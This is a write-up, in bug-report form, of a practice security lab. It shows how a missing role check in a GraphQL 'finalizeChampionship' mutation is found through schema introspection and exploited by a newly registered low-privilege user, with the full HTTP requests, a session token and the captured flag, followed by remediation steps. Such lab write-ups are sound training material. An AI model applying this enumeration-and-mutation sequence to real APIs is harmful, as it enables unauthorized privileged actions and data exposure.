# Bug Report - sokudo-006: Unauthenticated GraphQL Mutation Finalizes Championship and Exposes Prize Code

**Lab:** sokudo-006  
**Difficulty:** Easy  
**Date:** 2026-06-26  
**Severity:** High  
**CWE:** CWE-285 (Improper Authorization)  
**CVSS:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) - low-privilege account required, no interaction needed  

---

## Summary

The `finalizeChampionship` GraphQL mutation performs no role or authorization check. Any authenticated user can call it to finalize the active championship season. The mutation returns a `prizeCode` field containing the flag. GraphQL introspection is enabled, making the mutation and its return type fully discoverable without any prior knowledge of the schema.

---

## Steps to Reproduce

**Step 1 - Register a low-privilege account**

```http
POST /api/register HTTP/1.1
Host: lab-1782472251390-dbyjeb.labs-app.bugforge.io
Content-Type: application/json

{"username":"hacker1","email":"hacker1@evil.com","password":"Password123!"}
```

Response:
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NywidXNlcm5hbWUiOiJoYWNrZXIxIiwiaWF0IjoxNzgyNDcyMzQ1fQ.sd0-PUt_wM62YexIIshC760IYjeA7O2-oz5_twanUsU","user":{"id":7,"username":"hacker1","email":"hacker1@evil.com"}}
```

**Step 2 - Enumerate mutations via introspection**

```http
POST /api/graphql HTTP/1.1
Host: lab-1782472251390-dbyjeb.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NywidXNlcm5hbWUiOiJoYWNrZXIxIiwiaWF0IjoxNzgyNDcyMzQ1fQ.sd0-PUt_wM62YexIIshC760IYjeA7O2-oz5_twanUsU
Content-Type: application/json

{"query":"{ __type(name: \"Mutation\") { fields { name args { name type { name kind ofType { name kind } } } } } }"}
```

Response:
```json
{
  "data": {
    "__type": {
      "fields": [
        {
          "name": "finalizeChampionship",
          "args": [{"name": "seasonId", "type": {"name": null, "kind": "NON_NULL", "ofType": {"name": "ID", "kind": "SCALAR"}}}]
        }
      ]
    }
  }
}
```

**Step 3 - Introspect the return type to identify all fields**

```http
POST /api/graphql HTTP/1.1
Host: lab-1782472251390-dbyjeb.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NywidXNlcm5hbWUiOiJoYWNrZXIxIiwiaWF0IjoxNzgyNDcyMzQ1fQ.sd0-PUt_wM62YexIIshC760IYjeA7O2-oz5_twanUsU
Content-Type: application/json

{"query":"{ __type(name: \"ChampionshipResult\") { fields { name } } }"}
```

Response reveals: `seasonId`, `champion`, `finalized`, `prizeCode`.

**Step 4 - Get the current season ID**

```http
POST /api/graphql HTTP/1.1
Host: lab-1782472251390-dbyjeb.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NywidXNlcm5hbWUiOiJoYWNrZXIxIiwiaWF0IjoxNzgyNDcyMzQ1fQ.sd0-PUt_wM62YexIIshC760IYjeA7O2-oz5_twanUsU
Content-Type: application/json

{"query":"{ currentSeason { id name status } }"}
```

Response:
```json
{"data": {"currentSeason": {"id": "1", "name": "Spring 2026 Velocity Championship", "status": "open"}}}
```

**Step 5 - Call the mutation as a low-privilege user**

```http
POST /api/graphql HTTP/1.1
Host: lab-1782472251390-dbyjeb.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NywidXNlcm5hbWUiOiJoYWNrZXIxIiwiaWF0IjoxNzgyNDcyMzQ1fQ.sd0-PUt_wM62YexIIshC760IYjeA7O2-oz5_twanUsU
Content-Type: application/json

{"query":"mutation { finalizeChampionship(seasonId: \"1\") { seasonId champion finalized prizeCode } }"}
```

Response:
```json
{
  "data": {
    "finalizeChampionship": {
      "seasonId": "1",
      "champion": "speedtyper",
      "finalized": true,
      "prizeCode": "bug{VC7QYQ0Qo24IBasGJKx8VhPjmEoLoLpX}"
    }
  }
}
```

---

## Impact

- Any authenticated user can finalize the championship season, an action that should be restricted to admins
- The `prizeCode` (flag) is returned directly in the mutation response to any caller
- GraphQL introspection is fully enabled, meaning the entire schema - including sensitive mutations not surfaced in the UI - is discoverable without source access
- The REST `/api/admin/*` routes correctly gate on role, but the GraphQL mutation layer has no equivalent check

---

## Root Cause

The `finalizeChampionship` resolver applies no role or ownership check before executing. The REST admin middleware is not reused at the GraphQL resolver level, creating a gap where privileged write operations are accessible to any valid session token.

---

## Remediation

1. Add a role check at the start of the `finalizeChampionship` resolver - assert `ctx.user.role === 'admin'` before proceeding
2. Disable GraphQL introspection in production to prevent schema enumeration
3. Audit all GraphQL mutations to confirm they have equivalent authorization to their REST counterparts
4. Apply a shared authorization middleware at the GraphQL context level rather than duplicating checks per resolver

---

## Flag

`bug{VC7QYQ0Qo24IBasGJKx8VhPjmEoLoLpX}`
